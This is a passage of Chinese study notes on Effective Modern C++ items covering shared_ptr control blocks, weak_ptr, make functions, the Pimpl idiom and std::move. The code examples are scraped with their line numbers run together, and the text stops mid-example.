从原始指针上构造超过一个std::shared_ptr会造成未定义行为，因为指向的对象有多个控制块关联。多个控制块意味着多个引用计数值，多个引用计数值意味着对象将会被销毁多次（每个引用计数一次）。那意味着像下面的代码是有问题的： 12345auto pw = new Widget; //pw是原始指针…std::shared_ptr&lt;Widget&gt; spw1(pw, loggingDel); //为*pw创建控制块…std::shared_ptr&lt;Widget&gt; spw2(pw, loggingDel); //为*pw创建第二个控制块 使用智能指针而不是原始指针。 使用 std::shared_ptr 的建议是：第一，避免传给std::shared_ptr构造函数原始指针。通常替代方案是使用std::make_shared，不过用std::make_shared就没办法使用自定义删除器。第二，如果你必须传给std::shared_ptr构造函数原始指针，直接传new出来的结果，不要传指针变量。 12std::shared_ptr&lt;Widget&gt; spw1(new Widget, //直接使用new的结果 loggingDel); 创建spw2也会很自然的用spw1作为初始化参数（即用std::shared_ptr拷贝构造函数），那就没什么问题了： 1std::shared_ptr&lt;Widget&gt; spw2(spw1); //spw2使用spw1一样的控制块 this 指针：避免创建多余的控制块 std::enable_shared_from_this。如果你想创建一个用std::shared_ptr管理的类，这个类能够用this指针安全地创建一个std::shared_ptr，std::enable_shared_from_this就可作为基类的模板类。Widget将会继承自std::enable_shared_from_this： 123456class Widget: public std::enable_shared_from_this&lt;Widget&gt; &#123;public: … void process(); …&#125;; 这个标准名字就是奇异递归模板模式（The Curiously Recurring Template Pattern（CRTP））。 std::enable_shared_from_this 定义了一个成员函数，成员函数会创建指向当前对象的std::shared_ptr 却不创建多余控制块。这个成员函数就是shared_from_this，无论在哪当你想在成员函数中使用std::shared_ptr指向this所指对象时都请使用它。这里有个Widget::process的安全实现： 1234567void Widget::process()&#123; //和之前一样，处理Widget … //把指向当前对象的std::shared_ptr加入processedWidgets processedWidgets.emplace_back(shared_from_this());&#125; 从内部来说，shared_from_this查找当前对象控制块，然后创建一个新的std::shared_ptr关联这个控制块。设计的依据是当前对象已经存在一个关联的控制块。 要想符合设计依据的情况，必须已经存在一个指向当前对象的std::shared_ptr（比如调用shared_from_this的成员函数外面已经存在一个std::shared_ptr）。如果没有std::shared_ptr指向当前对象（即当前对象没有关联控制块），行为是未定义的，shared_from_this通常抛出一个异常。 要想防止客户端在存在一个指向对象的std::shared_ptr前先调用含有shared_from_this的成员函数，继承自std::enable_shared_from_this的类通常将它们的构造函数声明为private，并且让客户端通过返回std::shared_ptr的工厂函数创建对象。以Widget为例，代码可以是这样： 1234567891011class Widget: public std::enable_shared_from_this&lt;Widget&gt; &#123;public: //完美转发参数给private构造函数的工厂函数 template&lt;typename... Ts&gt; static std::shared_ptr&lt;Widget&gt; create(Ts&amp;&amp;... params); … void process(); //和前面一样 …private: … //构造函数&#125;; 确保需要先调用 create，才能调用 process。 shared_ptr 开销 控制块通常只占几个word大小，自定义删除器和分配器可能会让它变大一点。通常控制块的实现比你想的更复杂一些。它使用继承，甚至里面还有一个虚函数（用来确保指向的对象被正确销毁）。这意味着使用std::shared_ptr ，会带来使用虚函数带来的成本。 使用默认删除器和默认分配器，使用std::make_shared创建std::shared_ptr，产生的控制块只需三个word大小。它的分配基本上是无开销的。 对std::shared_ptr解引用的开销不会比原始指针高。执行需要原子引用计数修改的操作需要承担一两个原子操作开销，这些操作通常都会一一映射到机器指令上，所以即使对比非原子指令来说，原子指令开销较大，但是它们仍然只是单个指令上的。对于每个被std::shared_ptr指向的对象来说，控制块中的虚函数机制产生的开销通常只需要承受一次，即对象销毁的时候。 如果独占资源可行或者可能可行，用std::unique_ptr是一个更好的选择。它的性能表现更接近于原始指针，并且从std::unique_ptr升级到std::shared_ptr也很容易，因为std::shared_ptr可以从std::unique_ptr上创建。 从 std::shared_ptr转换到 std::unique_ptr 是不行的 。当你的资源由std::shared_ptr管理，现在又想修改资源生命周期管理方式是没有办法的。即使引用计数为一，你也不能重新修改资源所有权，改用std::unique_ptr管理它。资源和指向它的std::shared_ptr的签订的所有权协议是“除非死亡否则永不分开”。不能分离，不能废除，没有特许。 std::shared_ptr不能处理的另一个东西是数组。和std::unique_ptr不同的是，std::shared_ptr的API设计之初就是针对单个对象的，没有办法std::shared_ptr&lt;T[]&gt;。 std::shared_ptr没有提供operator[]，所以数组索引操作需要借助怪异的指针算术。另一方面，std::shared_ptr支持转换为指向基类的指针，这对于单个对象来说有效，但是当用于数组类型时这是容易出问题。（出于这个原因，std::unique_ptr&lt;T[]&gt; API禁止这种转换。） 更重要的是，C++11已经提供了很多内置数组的候选方案（比如std::array，std::vector，std::string）。所以，声明一个指向数组的智能指针几乎总是糟糕的设计。 结论 std::shared_ptr为有共享所有权的任意资源提供一种自动垃圾回收的便捷方式。 较之于std::unique_ptr，std::shared_ptr对象通常大两倍，控制块会产生开销，需要原子性的引用计数修改操作。 std::shared_ptr 默认资源销毁是通过delete，但是也支持自定义删除器。但是删除器的类型不是 std::shared_ptr 的类型的一部分。 避免从原始指针变量上创建std::shared_ptr。 20 当std::shared_ptr可能悬空时使用std::weak_ptr 一个真正的智能指针应该跟踪所指对象，在悬空时知晓，悬空（dangle）就是指针指向的对象不再存在。这就是对std::weak_ptr最精确的描述。 std::weak_ptr不能解引用，也不能测试是否为空值。因为std::weak_ptr不是一个独立的智能指针。它是std::shared_ptr的增强。 std::weak_ptr通常从std::shared_ptr上创建。当从std::shared_ptr上创建std::weak_ptr时两者指向相同的对象，但是std::weak_ptr不会影响所指对象的引用计数。 12345678auto spw = //spw创建之后，指向的Widget的 std::make_shared&lt;Widget&gt;(); //引用计数（ref count，RC）为1。 …std::weak_ptr&lt;Widget&gt; wpw(spw); //wpw指向与spw所指相同的Widget。RC仍为1…spw = nullptr; //RC变为0，Widget被销毁。 //wpw现在悬空 悬空的std::weak_ptr被称作已经expired（过期）。你可以用它直接做测试： 1if (wpw.expired()) … //如果wpw没有指向对象… 但是通常你期望的是检查std::weak_ptr是否已经过期，如果没有过期则访问其指向的对象。不过，将检查是否过期和解引用分开会引入竞态条件：在调用expired和解引用操作之间，另一个线程可能对指向这对象的std::shared_ptr重新赋值或者析构，并由此造成对象已析构。这种情况下，你的解引用将会产生未定义行为。 你需要的是一个原子操作检查std::weak_ptr是否已经过期，如果没有过期就访问所指对象。这可以通过从std::weak_ptr创建std::shared_ptr来实现，具体有两种形式可以从std::weak_ptr上创建std::shared_ptr，具体用哪种取决于std::weak_ptr过期时你希望std::shared_ptr表现出什么行为。 一种形式是std::weak_ptr::lock，它返回一个std::shared_ptr，如果std::weak_ptr过期这个std::shared_ptr为空： 123std::shared_ptr&lt;Widget&gt; spw1 = wpw.lock(); //如果wpw过期，spw1就为空 auto spw2 = wpw.lock(); //同上，但是使用auto 另一种形式是以std::weak_ptr为实参构造std::shared_ptr。这种情况中，如果std::weak_ptr过期，会抛出一个异常： 1std::shared_ptr&lt;Widget&gt; spw3(wpw); //如果wpw过期，抛出std::bad_weak_ptr异常 一个例子 考虑一个工厂函数，它基于一个唯一ID从只读对象上产出智能指针。根据条款18的描述，工厂函数会返回一个该对象类型的std::unique_ptr： 1std::unique_ptr&lt;const Widget&gt; loadWidget(WidgetID id); 如果调用loadWidget是一个昂贵的操作（比如它操作文件或者数据库I/O）并且重复使用ID很常见，一个合理的优化是再写一个函数除了完成loadWidget做的事情之外再缓存它的结果。另一个合理的优化可以是当Widget不再使用的时候销毁它的缓存。 对于可缓存的工厂函数，返回std::unique_ptr不是好的选择。调用者应该接收缓存对象的智能指针，调用者也应该确定这些对象的生命周期，但是缓存本身也需要一个指针指向它所缓存的对象。缓存对象的指针需要知道它是否已经悬空，因为当工厂客户端使用完工厂产生的对象后，对象将被销毁，关联的缓存条目会悬空。所以缓存应该使用std::weak_ptr，这可以知道是否已经悬空。这意味着工厂函数返回值类型应该是std::shared_ptr，因为只有当对象的生命周期由std::shared_ptr管理时，std::weak_ptr才能检测到悬空。 一个简版的实现： 123456789101112131415std::shared_ptr&lt;const Widget&gt; fastLoadWidget(WidgetID id)&#123; static std::unordered_map&lt;WidgetID, std::weak_ptr&lt;const Widget&gt;&gt; cache; //std::weak_ptr&lt;const Widget&gt; auto objPtr = cache[id].lock(); //objPtr是去缓存对象的 //std::shared_ptr（或 //当对象不在缓存中时为null） if (!objPtr) &#123; //如果不在缓存中 objPtr = loadWidget(id); //加载它 cache[id] = objPtr; //缓存它 &#125; return objPtr;&#125; fastLoadWidget的实现仍有以下问题：缓存可能会累积过期的std::weak_ptr，这些指针对应了不再使用的Widget（也已经被销毁了）。 另一个例子 考虑第二个用例：观察者设计模式（Observer design pattern）。 此模式的主要组件是subjects（状态可能会更改的对象）和observers（状态发生更改时要通知的对象）。在大多数实现中，每个subject都包含一个数据成员，该成员持有指向其observers的指针。这使subjects很容易发布状态更改通知。 subjects对控制observers的生命周期（即它们什么时候被销毁）没有兴趣，但是subjects对确保另一件事具有极大的兴趣，那事就是一个observer被销毁时，不再尝试访问它。一个合理的设计是每个subject持有一个std::weak_ptrs容器指向observers，因此可以在使用前检查是否已经悬空。 最后一个例子 考虑一个持有三个对象A、B、C的数据结构，A和C共享B的所有权，因此持有std::shared_ptr： item20_fig1 假定从B指向A的指针也很有用。应该使用哪种指针？ item20_fig2 有三种选择： 原始指针。使用这种方法，如果A被销毁，但是C继续指向B，B就会有一个指向A的悬空指针。而且B不知道指针已经悬空，所以B可能会继续访问，就会导致未定义行为。 std::shared_ptr。这种设计，A和B都互相持有对方的std::shared_ptr，导致的std::shared_ptr环状结构（A指向B，B指向A）阻止A和B的销毁。甚至A和B无法从其他数据结构访问了（比如，C不再指向B），每个的引用计数都还是1。如果发生了这种情况，A和B都被泄漏：程序无法访问它们，但是资源并没有被回收。 std::weak_ptr。这避免了上述两个问题。如果A被销毁，B指向它的指针悬空，但是B可以检测到这件事。尤其是，尽管A和B互相指向对方，B的指针不会影响A的引用计数，因此在没有std::shared_ptr指向A时不会导致A无法被销毁。 但是，需要注意使用std::weak_ptr打破std::shared_ptr循环并不常见。在严格分层的数据结构比如树中，子节点只被父节点持有。当父节点被销毁时，子节点就被销毁。从父到子的链接关系可以使用std::unique_ptr很好的表征。从子到父的反向连接可以使用原始指针安全实现，因为子节点的生命周期肯定短于父节点。因此没有子节点解引用一个悬空的父节点指针这样的风险。 从效率角度来看，std::weak_ptr与std::shared_ptr基本相同。两者的大小是相同的，使用相同的控制块。构造、析构、赋值操作涉及引用计数的原子操作。 虽然，std::weak_ptr不参与对象的共享所有权，因此不影响指向对象的引用计数。实际上在控制块中还是有第二个引用计数，std::weak_ptr操作的是第二个引用计数。 结论 用std::weak_ptr替代可能会悬空的std::shared_ptr。 std::weak_ptr的潜在使用场景包括：缓存、观察者列表、打破std::shared_ptr环状结构。 21 优先考虑使用std::make_unique和std::make_shared，而非直接使用new std::make_shared是C++11标准的一部分，但是，std::make_unique是从C++14开始加入标准库。 一个基础版本的std::make_unique是很容易自己写出的，如下： 1234template&lt;typename T, typename... Ts&gt;std::unique_ptr&lt;T&gt; make_unique(Ts&amp;&amp;... params) &#123; return std::unique_ptr&lt;T&gt;(new T(std::forward&lt;Ts&gt;(params)...));&#125; 这种形式的函数不支持数组和自定义析构（见条款18） std::make_unique和std::make_shared是三个make函数 中的两个：接收任意的多参数集合，完美转发到构造函数去动态分配一个对象，然后返回这个指向这个对象的指针。 第三个make函数是std::allocate_shared。它行为和std::make_shared一样，只不过第一个参数是用来动态分配内存的allocator对象。 使用 std::make_unique 的理由一 例如： 1234auto upw1(std::make_unique&lt;Widget&gt;()); //使用make函数std::unique_ptr&lt;Widget&gt; upw2(new Widget); //不使用make函数auto spw1(std::make_shared&lt;Widget&gt;()); //使用make函数std::shared_ptr&lt;Widget&gt; spw2(new Widget); //不使用make函数 我高亮了关键区别：使用new的版本重复了类型，但是make函数的版本没有。 重复写类型和软件工程里面一个关键原则相冲突：应该避免重复代码。源代码中的重复增加了编译的时间，会导致目标代码冗余，并且通常会让代码库使用更加困难。 它经常演变成不一致的代码，而代码库中的不一致常常导致bug。 使用 std::make_unique 的理由二 在调用processWidget时使用了new而不是std::make_shared： 12processWidget(std::shared_ptr&lt;Widget&gt;(new Widget), //潜在的资源泄漏！ computePriority()); 内存泄漏的原因在于： 在运行时，一个函数的实参必须先被计算，这个函数再被调用，所以在调用processWidget之前，必须执行以下操作，processWidget才开始执行： 表达式“new Widget”必须计算，例如，一个Widget对象必须在堆上被创建 负责管理new出来指针的std::shared_ptr&lt;Widget&gt;构造函数必须被执行 computePriority必须运行 而编译器不保证按照顺序生成代码。 虽然“new Widget”必须在std::shared_ptr的构造函数被调用前执行，因为new出来的结果作为构造函数的实参，但computePriority可能在这之前，之后，或者之间执行。也就是说，编译器可能按照这个执行顺序生成代码： 执行“new Widget” 执行computePriority 运行std::shared_ptr构造函数 在运行时computePriority产生了异常，那么第一步动态分配的Widget就会泄漏。因为它永远都不会被第三步的std::shared_ptr所管理了。 使用std::make_shared可以防止这种问题。调用代码看起来像是这样： 12processWidget(std::make_shared&lt;Widget&gt;(), //没有潜在的资源泄漏 computePriority()); 在运行时，std::make_shared和computePriority其中一个会先被调用。 使用 std::make_unique 的理由三 使用std::make_shared允许编译器生成更小，更快的代码，并使用更简洁的数据结构。考虑以下对new的直接使用： 1std::shared_ptr&lt;Widget&gt; spw(new Widget); 显然，这段代码需要进行内存分配，但它实际上执行了两次。 每个std::shared_ptr指向一个控制块，其中包含被指向对象的引用计数，还有其他东西。这个控制块的内存在std::shared_ptr构造函数中分配。因此，直接使用new需要为Widget进行一次内存分配，为控制块再进行一次内存分配。 如果使用std::make_shared代替： 1auto spw = std::make_shared&lt;Widget&gt;(); 一次分配足矣。这是因为std::make_shared分配一块内存，同时容纳了Widget对象和控制块。这种优化减少了程序的静态大小，因为代码只包含一个内存分配调用，并且它提高了可执行代码的速度，因为内存只分配一次。此外，使用std::make_shared避免了对控制块中的某些簿记信息的需要，潜在地减少了程序的总内存占用。 不使用 std::make_shared 的情况 需要自定义删除器时 make函数都不允许指定自定义删除器，但是std::unique_ptr和std::shared_ptr有构造函数这么做。有个Widget的自定义删除器： 1auto widgetDeleter = [](Widget* pw) &#123; … &#125;; 创建一个使用它的智能指针只能直接使用new： 1234std::unique_ptr&lt;Widget, decltype(widgetDeleter)&gt; upw(new Widget, widgetDeleter);std::shared_ptr&lt;Widget&gt; spw(new Widget, widgetDeleter); 对于make函数，没有办法做同样的事情。 不支持花括号调用 std::initializer_list 常规的用花括号创建的对象更倾向于使用std::initializer_list作为形参的重载形式，而用小括号创建对象将调用不用std::initializer_list作为参数的的重载形式。 但是，在这些调用中， 12auto upv = std::make_unique&lt;std::vector&lt;int&gt;&gt;(10, 20);auto spv = std::make_shared&lt;std::vector&lt;int&gt;&gt;(10, 20); 生成的智能指针指向带有10个元素的std::vector，每个元素值为20。 如果你想用花括号初始化指向的对象，你必须直接使用new。 一个变通的方法：使用auto类型推导从花括号初始化创建std::initializer_list对象，然后将auto创建的对象传递给make函数。 1234//创建std::initializer_listauto initList = &#123; 10, 20 &#125;;//使用std::initializer_list为形参的构造函数创建std::vectorauto spv = std::make_shared&lt;std::vector&lt;int&gt;&gt;(initList); 对于std::unique_ptr，只有这两种情景（自定义删除器和花括号初始化）使用make函数有点问题。对于std::shared_ptr和它的make函数，还有2个问题。都属于边缘情况，但是一些开发者常碰到。 类重载了operator new和operator delete 例如，Widget类的operator new和operator delete只会处理sizeof(Widget)大小的内存块的分配和释放。因为std::allocate_shared需要的内存总大小不等于动态分配的对象大小，还需要再加上控制块大小。 与直接使用new相比，std::make_shared在大小和速度上的优势源于std::shared_ptr的控制块与指向的对象放在同一块内存中。当对象的引用计数降为0，对象被销毁（即析构函数被调用）。但是，因为控制块和对象被放在同一块分配的内存块中，直到控制块的内存也被销毁，对象占用的内存才被释放。 控制块除了引用计数，还包含簿记信息。引用计数追踪有多少std::shared_ptrs指向控制块，但控制块还有第二个计数，记录多少个std::weak_ptrs指向控制块。第二个引用计数就是weak count。当一个std::weak_ptr检测它是否过期时，它会检测指向的控制块中的引用计数（而不是weak count）。 如果引用计数是0（即对象没有std::shared_ptr再指向它，已经被销毁了），std::weak_ptr就已经过期。 但是只要std::weak_ptrs引用一个控制块（即weak count大于零），该控制块必须继续存在。只要控制块存在，包含它的内存就必须保持分配。 所以，通过std::shared_ptr的make函数分配的内存，直到最后一个std::shared_ptr和最后一个指向它的std::weak_ptr已被销毁，才会释放。 所以，如果对象类型非常大，而且销毁最后一个std::shared_ptr和销毁最后一个std::weak_ptr之间的时间很长，那么在销毁对象和释放它所占用的内存之间可能会出现延迟。 例如，下面这种情况，明显，直接只用new，对象的释放会立即执行。 123456789101112131415class ReallyBigType &#123; … &#125;;auto pBigObj = //通过std::make_shared std::make_shared&lt;ReallyBigType&gt;(); //创建一个大对象 … //创建std::shared_ptrs和std::weak_ptrs //指向这个对象，使用它们… //最后一个std::shared_ptr在这销毁， //但std::weak_ptrs还在… //在这个阶段，原来分配给大对象的内存还分配着… //最后一个std::weak_ptr在这里销毁； //控制块和对象的内存被释放 直接只用new，一旦最后一个std::shared_ptr被销毁，ReallyBigType对象的内存就会被释放： 12345678910111213141516class ReallyBigType &#123; … &#125;; //和之前一样std::shared_ptr&lt;ReallyBigType&gt; pBigObj(new ReallyBigType); //通过new创建大对象… //像之前一样，创建std::shared_ptrs和std::weak_ptrs //指向这个对象，使用它们 … //最后一个std::shared_ptr在这销毁, //但std::weak_ptrs还在； //对象的内存被释放… //在这阶段，只有控制块的内存仍然保持分配… //最后一个std::weak_ptr在这里销毁； //控制块内存被释放 一个优化的例子 考虑前面的 processWidget 函数，现在我们指定一个自定义删除器: 123void processWidget(std::shared_ptr&lt;Widget&gt; spw, //和之前一样 int priority);void cusDel(Widget *ptr); //自定义删除器 下面这个是非异常安全的调用： 1234processWidget( //和之前一样， std::shared_ptr&lt;Widget&gt;(new Widget, cusDel), //潜在的内存泄漏！ computePriority() ); 还是实参调用的顺序问题。 一个优化方式如下： 12std::shared_ptr&lt;Widget&gt; spw(new Widget, cusDel);processWidget(spw, computePriority()); // 正确，但是没优化，见下 但是有一个性能问题，实参在前一个非异常安全调用中，std::shared_ptr形参是传值，从右值构造只需要移动。 而优化后，传递左值构造需要拷贝。对std::shared_ptr而言，这种区别是有意义的，因为拷贝std::shared_ptr需要对引用计数原子递增，移动则不需要对引用计数有操作。 所以，更高效安全的版本是： 1processWidget(std::move(spw), computePriority()); //高效且异常安全 结论 和直接使用new相比，make函数消除了代码重复，提高了异常安全性。对于std::make_shared和std::allocate_shared，生成的代码更小更快。 不适合使用make函数的情况包括需要指定自定义删除器和希望用花括号初始化。 对于std::shared_ptrs，其他不建议使用make函数的情况包括：(1) 有自定义内存管理的类；(2) 特别关注内存的系统，非常大的对象，以及std::weak_ptrs比对应的std::shared_ptrs活得更久。 22 当使用 Pimpl Idiom，请在实现文件中定义特殊成员函数 Pimpl Idiom 将类数据成员替换成一个指向包含具体实现的类（implementation class）（或结构体）的指针，并将原本放在主类（primary class）的相关数据成员们移动到实现类（implementation class）去，而这些数据成员的访问将通过指针间接访问。 举个例子： 123456789class Widget() &#123; //定义在头文件“widget.h”public: Widget(); …private: std::string name; std::vector&lt;double&gt; data; Gadget g1, g2, g3; //Gadget是用户自定义的类型&#125;; 因为类Widget的数据成员包含有类型std::string，std::vector和Gadget， 定义有这些类型的头文件在类Widget编译的时候，必须被包含进来，这意味着类Widget的使用者必须要#include &lt;string&gt;，&lt;vector&gt;以及gadget.h。 这些头文件将会增加类Widget使用者的编译时间，并且让这些使用者依赖于这些头文件。 如果一个头文件的内容变了，类Widget使用者也必须要重新编译。 标准库文件&lt;string&gt;和&lt;vector&gt;不是很常变，但是gadget.h可能会经常修订。 在C++98中使用Pimpl惯用法，可以把Widget的数据成员替换成一个原始指针，指向一个已经被声明过却还未被定义的结构体: 1234567891011class Widget //仍然在“widget.h”中&#123;public: Widget(); ~Widget(); …private: struct Impl; //声明一个 实现结构体 Impl *pImpl; //以及指向它的指针&#125;; 因为类Widget不再提到类型std::string，std::vector以及Gadget，Widget的使用者不再需要为了这些类型而引入头文件。 这可以加速编译，并且意味着，如果这些头文件中有所变动，Widget的使用者不会受到影响。 一个已经被声明，却还未被实现的类型，被称为未完成类型（incomplete type）。 Widget::Impl就是这种类型。 下一步是对 实现类（implementation class） 的内存管理： 在Widget.cpp里: 1234567891011121314151617#include \"widget.h\" //以下代码均在实现文件“widget.cpp”里#include \"gadget.h\"#include &lt;string&gt;#include &lt;vector&gt;struct Widget::Impl &#123; //含有之前在Widget中的数据成员的 std::string name; //Widget::Impl类型的定义 std::vector&lt;double&gt; data; Gadget g1,g2,g3;&#125;;Widget::Widget() //为此Widget对象分配数据成员: pImpl(new Impl)&#123;&#125;Widget::~Widget() //销毁数据成员&#123; delete pImpl; &#125; 它使用了原始指针，原始的new和原始的delete，一切都让它如此的...原始。 使用智能指针 如果我们想要的只是在类Widget的构造函数动态分配Widget::impl对象，在Widget对象销毁时一并销毁它， std::unique_ptr是最合适的工具。 123456789class Widget &#123; //在“widget.h”中public: Widget(); …private: struct Impl; std::unique_ptr&lt;Impl&gt; pImpl; //使用智能指针而不是原始指针&#125;; 实现文件也可以改成如下： 1234567891011121314#include \"widget.h\" //在“widget.cpp”中#include \"gadget.h\"#include &lt;string&gt;#include &lt;vector&gt;struct Widget::Impl &#123; //跟之前一样 std::string name; std::vector&lt;double&gt; data; Gadget g1,g2,g3;&#125;;Widget::Widget() : pImpl(std::make_unique&lt;Impl&gt;()) &#123;&#125; 问题出现了 以上的代码能编译，但是，最普通的Widget用法却会导致编译出错： 123#include \"widget.h\"Widget w; //错误！ 在对象w被析构时（例如离开了作用域），问题出现了。 在这个时候，它的析构函数被调用。我们在类的定义里使用了std::unique_ptr，所以我们没有声明析构函数。编译器会自动为我们生成一个析构函数。 在这个析构函数里，编译器会插入一些代码来调用类Widget的数据成员pImpl的析构函数。 问题就在于，此时pImpl的析构函数调用默认的删除器。默认删除器是一个函数，它使用delete来销毁内置于std::unique_ptr的原始指针。然而，在使用delete之前，通常会使默认删除器使用C++11的特性static_assert来确保原始指针指向的类型不是一个未完成类型。 需要确保在编译器生成销毁std::unique_ptr&lt;Widget::Impl&gt;的代码之前， Widget::Impl已经是一个完成类型（complete type）。 当编译器“看到”它的定义的时候，该类型就成为完成类型了。 但是 Widget::Impl的定义在widget.cpp里。 成功编译的关键，就是在widget.cpp文件内，让编译器在“看到” Widget的析构函数实现之前（也即编译器插入的，用来销毁std::unique_ptr这个数据成员的代码段之前），先定义Widget::Impl。 修改方法就是，在widget.h里只声明类Widget的析构函数，但不要在这里定义它： 12345678910class Widget &#123; //跟之前一样，在“widget.h”中public: Widget(); ~Widget(); //只有声明语句 …private: //跟之前一样 struct Impl; std::unique_ptr&lt;Impl&gt; pImpl;&#125;; 在widget.cpp文件中，在结构体Widget::Impl被定义之后，再定义析构函数： 123456789101112131415161718#include \"widget.h\" //跟之前一样，在“widget.cpp”中#include \"gadget.h\"#include &lt;string&gt;#include &lt;vector&gt;// 先于析构函数定义struct Widget::Impl &#123; //跟之前一样，定义Widget::Impl std::string name; std::vector&lt;double&gt; data; Gadget g1,g2,g3;&#125;Widget::Widget() //跟之前一样: pImpl(std::make_unique&lt;Impl&gt;())&#123;&#125;Widget::~Widget() //析构函数的定义&#123;&#125; 如果你想强调编译器自动生成的析构函数会做和你一样正确的事情，你可以直接使用“= default”定义析构函数体 1Widget::~Widget() = default; //同上述代码效果一致 移动 编译器自动生成的移动操作对其中的std::unique_ptr进行移动。但是，声明一个类Widget的析构函数会阻止编译器生成移动操作，所以你需要这样做： 12345678910111213class Widget &#123; //仍然在“widget.h”中public: Widget(); ~Widget(); Widget(Widget&amp;&amp; rhs) = default; //思路正确， Widget&amp; operator=(Widget&amp;&amp; rhs) = default; //但代码错误 …private: //跟之前一样 struct Impl; std::unique_ptr&lt;Impl&gt; pImpl;&#125;; 问题在于： 编译器生成的移动赋值操作符，在重新赋值之前，需要先销毁指针pImpl指向的对象。然而在Widget的头文件里，pImpl指针指向的是一个未完成类型。 移动构造函数的情况有所不同。 移动构造函数的问题是编译器自动生成的代码里，包含有抛出异常的事件，在这个事件里会生成销毁pImpl的代码。 这些都需要，Impl是一个完成类型。 解决方法： 把移动操作的定义移动到实现文件里 12345678910111213class Widget &#123; //仍然在“widget.h”中public: Widget(); ~Widget(); Widget(Widget&amp;&amp; rhs); //只有声明 Widget&amp; operator=(Widget&amp;&amp; rhs); …private: //跟之前一样 struct Impl; std::unique_ptr&lt;Impl&gt; pImpl;&#125;; 12345678910111213#include &lt;string&gt; //跟之前一样，仍然在“widget.cpp”中… struct Widget::Impl &#123; … &#125;; //跟之前一样Widget::Widget() //跟之前一样: pImpl(std::make_unique&lt;Impl&gt;())&#123;&#125;Widget::~Widget() = default; //跟之前一样Widget::Widget(Widget&amp;&amp; rhs) = default; //这里定义Widget&amp; Widget::operator=(Widget&amp;&amp; rhs) = default; 拷贝 对于 struct Impl 中数据成员，可以使用默认拷贝函数，完成拷贝动作。 1234567891011class Widget &#123; //仍然在“widget.h”中public: … Widget(const Widget&amp; rhs); //只有声明 Widget&amp; operator=(const Widget&amp; rhs);private: //跟之前一样 struct Impl; std::unique_ptr&lt;Impl&gt; pImpl;&#125;; 12345678910111213141516#include &lt;string&gt; //跟之前一样，仍然在“widget.cpp”中… struct Widget::Impl &#123; … &#125;; //跟之前一样Widget::~Widget() = default; //其他函数，跟之前一样Widget::Widget(const Widget&amp; rhs) //拷贝构造函数: pImpl(std::make_unique&lt;Impl&gt;(*rhs.pImpl))&#123;&#125;Widget&amp; Widget::operator=(const Widget&amp; rhs) //拷贝operator=&#123; *pImpl = *rhs.pImpl; return *this;&#125; 利用了编译器会为我们自动生成结构体Impl的复制操作函数的机制，而不是逐一复制结构体Impl的成员，自动生成的复制操作能自动复制每一个成员。 std::shared_ptr 如果我们使用std::shared_ptr而不是std::unique_ptr来做pImpl指针，本条款的建议不再适用。 不需要在类Widget里声明析构函数，没有了用户定义析构函数，编译器将会成移动操作，并且将会如我们所期望般工作。widget.h里的代码如下， 123456789class Widget &#123; //在“widget.h”中public: Widget(); … //没有析构函数和移动操作的声明private: struct Impl; std::shared_ptr&lt;Impl&gt; pImpl; //用std::shared_ptr&#125;; //而不是std::unique_ptr 这是#include了widget.h的客户代码， 123Widget w1;auto w2(std::move(w1)); //移动构造w2w1 = std::move(w2); //移动赋值w1 这些都能编译，并且工作地如我们所望：w1将会被默认构造，它的值会被移动进w2，随后值将会被移动回w1，然后两者都会被销毁（指向的Widget::Impl对象一并也被销毁）。 std::unique_ptr和std::shared_ptr在pImpl指针上的表现上的区别的深层原因在于，他们支持自定义删除器的方式不同。 对std::unique_ptr而言，删除器的类型是这个智能指针的一部分，这让编译器有可能生成更小的运行时数据结构和更快的运行代码。 这种更高效率的后果之一就是std::unique_ptr指向的类型，在编译器的生成特殊成员函数（如析构函数，移动操作）被调用时，必须已经是一个完成类型。 而对std::shared_ptr而言，删除器的类型不是该智能指针的一部分，这让它会生成更大的运行时数据结构和稍微慢点的代码，但是当编译器生成的特殊成员函数被使用的时候，指向的对象不必是一个完成类型。 结论 Pimpl 惯用法通过减少在类实现和类使用者之间的编译依赖来减少编译时间。 对于std::unique_ptr类型的pImpl指针，需要在头文件的类里声明特殊成员函数，并在实现文件中 struct Impl定义之后来实现他们。即使是编译器自动生成的代码可以工作，也要这么做。 以上的建议只适用于std::unique_ptr，不适用于std::shared_ptr。 23 理解std::move和std::forward Intro 移动语义使编译器有可能用廉价的移动操作来代替昂贵的拷贝操作。正如拷贝构造函数和拷贝赋值操作符给了你控制拷贝语义的权力，移动构造函数和移动赋值操作符也给了你控制移动语义的权力。移动语义也允许创建只可移动（move-only）的类型，例如std::unique_ptr，std::future和std::thread。 完美转发使接收任意数量实参的函数模板成为可能，它可以将实参转发到其他的函数，使目标函数接收到的实参与被传递给转发函数的实参保持一致。 右值引用是连接这两个截然不同的概念的胶合剂。它是使移动语义和完美转发变得可能的基础语言机制。 但是，std::move并不移动任何东西，完美转发也并不完美。移动操作并不永远比复制操作更廉价。构造“type&amp;&amp;”也并非总是代表一个右值引用。 非常重要的一点是要牢记形参永远是左值，即使它的类型是一个右值引用。比如，假设 1void f(Widget&amp;&amp; w); 形参w是一个左值，即使它的类型是一个rvalue-reference-to-Widget。 std::move和std::forward不会做什么 std::move不移动（move）任何东西，std::forward也不转发（forward）任何东西。在运行时，它们不做任何事情。它们不产生任何可执行代码，一字节也没有。 std::move C++11的std::move的示例实现。它并不完全满足标准细则，但是它已经非常接近了。 123456789template&lt;typename T&gt; typename remove_reference&lt;T&gt;::type&amp;&amp;move(T&amp;&amp; param)&#123; using ReturnType = typename remove_reference&lt;T&gt;::type&amp;&amp;; return static_cast&lt;ReturnType&gt;(param);&#125; 该函数返回类型的&amp;&amp;部分表明std::move函数返回的是一个右值引用，但是，如果类型T恰好是一个左值引用，那么T&amp;&amp;将会成为一个左值引用。 所以，使用 std::remove_reference，得到 ReturnType。这保证了std::move返回的真的是右值引用。 std::move在C++14中可以被更简单地实现。 123456template&lt;typename T&gt;decltype(auto) move(T&amp;&amp; param) //在std命名空间&#123; using ReturnType = remove_referece_t&lt;T&gt;&amp;&amp;; return static_cast&lt;ReturnType&gt;(param);&#125; 因此，std::move将它的实参转换为一个右值，这就是它的全部作用。 const 的限制 1234567891011class Annotation &#123;public: explicit Annotation(const std::string text) ：value(std::move(text)) //“移动”text到value里；这段代码执行起来 &#123; … &#125; //并不是看起来那样 …private: std::string value;&#125;; 这段代码可以编译，可以链接，可以运行。 text通过std::move被转换到右值，但是text被声明为const std::string，所以在转换之前，text是一个左值的const std::string，而转换的结果是一个右值的const std::string 那么，string 对 value 赋值时，调用的是哪个构造函数？ 1234567class string &#123; //std::string事实上是public: 